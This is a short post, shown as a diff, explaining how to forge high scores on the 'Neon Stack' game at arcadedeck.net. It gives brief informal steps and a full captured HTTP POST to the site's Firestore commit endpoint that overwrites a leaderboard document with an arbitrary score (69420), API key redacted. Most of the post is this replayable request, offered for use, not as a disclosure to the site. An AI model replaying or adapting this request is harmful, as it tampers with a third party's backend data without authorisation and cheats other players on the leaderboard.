@@ -1,0 +1,62 @@
+URL: https://arcadedeck.net/play/neon-stack
+
+1. This is very easy, just change the score to what every you like. there is only to things to note, 1 it spams a lot, so you have 2 filter it a bit. 2. the first game you play it create your use, so its easy'er to use the second submission. 
+
+
+Post request for submitting high score:
+
+POST /v1/projects/ultragames-website/databases/(default)/documents:commit?key=[[[I REMOVED MY KEY]]] HTTP/2
+Host: firestore.googleapis.com
+Content-Length: 366
+Google-Cloud-Resource-Prefix: projects/ultragames-website/databases/(default)
+Sec-Ch-Ua-Platform: "Windows"
+X-Goog-Request-Params: project_id=ultragames-website
+Accept-Language: da-DK,da;q=0.9
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+X-Goog-Api-Client: gl-js/ fire/12.10.0_lite
+Sec-Ch-Ua-Mobile: ?0
+X-Firebase-Gmpid: 1:71123549613:web:8509e882fc8093a3fab524
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Content-Type: text/plain
+Accept: */*
+Origin: https://arcadedeck.net
+X-Client-Data: CMz0ygE=
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://arcadedeck.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{
+    writes: [
+        {
+            update: {
+                name: "projects/ultragames-website/databases/(default)/documents/leaderboards/8knsL5phP4Srp0dzm0mx",
+                fields: {
+                    score: {
+                        integerValue: "69420"
+                    },
+                    subScore: {
+                        integerValue: "3"
+                    }
+                }
+            },
+            updateMask: {
+                fieldPaths: [
+                    "score",
+                    "subScore"
+                ]
+            },
+            updateTransforms: [
+                {
+                    fieldPath: "createdAt",
+                    setToServerValue: "REQUEST_TIME"
+                }
+            ],
+            currentDocument: {
+                exists: true
+            }
+        }
+    ]
+}
